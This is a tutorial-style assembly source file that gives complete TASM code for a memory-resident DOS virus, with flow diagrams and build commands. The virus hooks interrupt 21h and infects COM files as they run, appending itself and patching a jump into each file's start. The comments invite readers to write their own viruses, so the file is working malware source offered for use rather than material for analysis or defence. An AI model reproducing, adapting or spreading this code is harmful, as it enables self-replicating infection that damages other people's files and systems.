   ; How to Write a Simple Resident COM File Virus.
   ; ==============================================
   ; NiL
   ;
   ; This code is a good thing for demo purposes only.  It has several
   ; shortcomings: No check whether the file size is larger than 65535
   ; after infection, file's date is not restored, no stealth/mutation
   ; mechanisms,  files  starting  with instruction JMP (E9h)  are not
   ; infected etc. Anyway you can figure out how to start writing your
   ; own viruses.
   ;
   ; 1. Body of virus.
   ; -----------------
   ; -> Ú>ÚÄÄ Jump to virus location.
   ; <- ³ ³   INFECTED PROGRAM.
   ;    ³ ÀÄ> Calculate virus offset (program size).
   ;    ³     Is virus already resident?
   ;    ³ ÚÄÄ   Yes           No
   ;    ³ ³
   ;    ³ ³   Move virus to memory.
   ;    ³ ³   Get original Int 21h handler address.
   ;    ³ ³   Set viruses Int 21h handler address.
   ;    ³ ÀÄ> Restore original beginning of program.
   ;    ÀÄÄÄÄ Start program.
   ;
   ; 2. Viruses Int 21h handler.
   ; ---------------------------
   ; ->       Is it execution service?
   ;    ÚÄÄÄÄ   No            Yes
   ;    ³
   ;    ³     Open executed file.
   ;    ³     Read beginning of file.
   ;    ³     Is file in EXE format?
   ;    ³ ÚÄÄ   Yes           No
   ;    ³ ³
   ;    ³ ³   Is file already infected?
   ;    ³ ÃÄÄ   Yes       No
   ;    ³ ³
   ;    ³ ³   Write virus to end of file.
   ;    ³ ³   Write "jump to virus location" instruction.
   ;    ³ ÀÄ> Close file.
   ; <- ÀÄÄÄ> Jump to original Int 21h handler.
   ;
   ;Assemble with TASM COMVIR.ASM
   ;              TLINK /t COMVIR.OBJ

        .MODEL  TINY
        .CODE
        ORG     100h

   ProgOfs  EQU     100h                  ;COM programs start at CS:0100h
   VirOfs   EQU     200h                  ;Location of virus in memory 0000h:0200h
   VirSize  EQU     @End-@Start           ;Size of virus
   oVirEnd  EQU     VirOfs+VirSize        ;Offset of end-of-virus in memory
   ;---------------------------- Body of virus -----------------------------------
   @Start:  CALL    @Next
   @Next:   POP     SI                    ;Get IP, calculate virus offset
        SUB     SI,(OFFSET @Next)-ProgOfs
        PUSH    SI                    ;and save it into stack

        XOR     AX,AX
        MOV     ES,AX
        MOV     DI,VirOfs
        CMPSB                         ;Virus already resident?
        JE  @Done

        DEC     DI
        DEC     SI
        MOV     CX,(VirSize+1)/2
        REP     MOVSW                 ;Move virus to memory (DS:[SI]->0:200h)

        MOV     SI,21h*4
        MOV     DI,oVirEnd-8          ;Place for original handler address
        PUSH    ES
        POP     DS
        MOVSW                         ;Save original Int 21h handler address
        MOVSW

        MOV     AX,2521h
        MOV     DX,(VirOfs+((OFFSET @New21)-ProgOfs))
        INT     21h                   ;Set viruses Int 21h handler address

        PUSH    CS                    ;Restore segment registers
        POP     DS
   @Done:   PUSH    CS
        POP     ES
        POP     SI                    ;Restore virus offset
        ADD     SI,VirSize-4
        MOV     DI,ProgOfs
        PUSH    DI                    ;Program offset into stack for RETN
        MOVSW                         ;Restore original beginning of file
        MOVSB
        RETN                          ;Jump to program code
   ;---------------------------- Int 21h handler ---------------------------------
   @New21:  CMP     AX,4B00h              ;Execution service?
        JNE     @NoExec
        PUSH    AX                    ;Save registers
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    DS

        MOV     AX,3D02h
        INT     21h                   ;Open executed file
        XCHG    BX,AX                 ;Handle of file into BX

        XOR     AX,AX
        MOV     DS,AX
        MOV     DX,oVirEnd-4
        MOV     SI,DX
        MOV     CX,3
        MOV     AH,3Fh
        INT     21h                   ;Read 3 first bytes from file to DS:[DX]

        CMP     BYTE PTR DS:[SI],'M'  ;File in EXE format?
        JE  @DoNot
        CMP     BYTE PTR DS:[SI],0E9h ;File already infected?
        JE  @DoNot

        MOV     AX,4202h
        XOR     CX,CX
        CWD                           ;0 into DX
        INT     21h                   ;Seek EOF (FileSize into AX)

        SUB     AX,3                  ;Calculate entry point
        MOV     DS:[oVirEnd],AX       ;and store it to virus

        MOV     CX,VirSize
        MOV     DX,VirOfs
        MOV     AH,40h
        INT     21h                   ;Write virus to end of file from DS:[DX]

        MOV     AX,4200h
        XOR     CX,CX
        CWD                           ;0 into DX
        INT     21h                   ;Seek beginning of file

        MOV     CX,3
        MOV     DX,oVirEnd-1
        MOV     AH,40h
        INT     21h                   ;Write jump instruction to file

   @DoNot:  MOV     AH,3Eh
        INT     21h                   ;Close file

        POP     DS                    ;Restore registers
        POP     DX
        POP     CX
        POP     BX
        POP     AX
   @NoExec: DB  0EAh                  ;Jump to
   ;-----------------------------------------------------------------------------
   Old21    DB  0,0,0,0               ;original Int 21h handler
   OldStart DB  0C3h,00h ,00h         ;Original beginning of program
   OurByte  DB  0E9h                  ;New beginning of program
   @End:    END     @Start
